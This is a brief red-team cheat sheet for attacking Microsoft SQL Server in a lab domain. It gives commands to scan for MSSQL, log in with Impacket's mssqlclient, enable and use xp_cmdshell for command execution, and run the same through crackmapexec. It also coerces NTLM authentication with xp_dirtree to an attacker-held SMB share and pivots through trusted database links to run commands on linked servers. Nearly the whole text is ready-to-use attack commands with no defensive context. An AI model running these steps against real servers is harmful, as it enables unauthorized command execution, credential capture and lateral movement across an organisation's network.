# Recon 
```
nmap -p 1433 -sV -sC 192.168.56.0/24
cme mssql 192.168.56.0/24
```
# Connection 
```
mssqlclient.py -windows-auth [Domain]/[User]:[Password]@[Server]
```
# Execute command
```
> enable_xp_cmdshell
> xp_cmdshell whoami
```
```
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"

```
# Coerce authentication
```
exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
```
# Trusted link
Represents trust relationships between MSSQL instance
```
SQL > enum_links
```

## Exploit
```
use_link [LINK] 
enable_xp_cmdshell 
xp_cmdshell [CMD]
```

# More information
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql
https://h4ms1k.github.io/Red_Team_MSSQL_Server/# 
https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet 

